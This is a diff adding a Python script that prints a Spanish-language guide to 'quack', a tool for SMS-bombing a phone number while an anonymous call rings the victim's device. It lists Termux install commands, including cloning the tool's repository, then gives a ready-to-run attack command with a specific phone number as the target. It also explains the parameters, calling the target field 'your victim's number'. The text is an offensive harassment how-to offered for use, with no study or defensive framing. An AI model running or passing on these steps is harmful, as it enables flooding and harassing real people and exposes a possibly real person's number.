@@ -1,0 +1,41 @@
+print ("""
+\033[1;31m¿Qué es quack?
+
+\033[1;39mquack es una herramienta que realiza spam de mensajes de texto a un número telefónico sin la necesidad de poseer saldo, además, mientras se realiza el spam, una llamada telefónica de un número completamente anónimo también aparece en el dispositivo de la víctima.
+
+\033[1;33mINSTALACIÓN DE quack EN TERMUX (ANDROID)
+\033[1;39m
+apt update && apt upgrade -y
+
+termux-setup-storage
+
+pkg install -y git
+
+pkg install -y python
+
+pkg install -y python2
+
+pip install --upgrade pip
+
+pip install requests
+
+git clone https://github.com/entynetproject/quack
+
+cd quack
+
+pip install -r requirements.txt
+
+chmod 711 quack
+\033[1;33m
+Hasta aquí la herramienta ya está instalada correctamente, ahora para ejecutarla y que empiece el spam debemos usar el siguiente comando:
+
+\033[1;32mpython quack --tool SMS --target +593981480757 --threads 10 --timeout 60
+
+\033[1;34mAl usar éste comando, el spam empezará al número telefónico colocado en ése comando, te doy un ejemplo de como funciona el comando:
+
+\033[1;39m[--target] = (Número de tu víctima)
+
+[--threads] = (Cantidad de mensajes)
+
+[--timeout] = (Tiempo de duración de los mensajes)
+""")
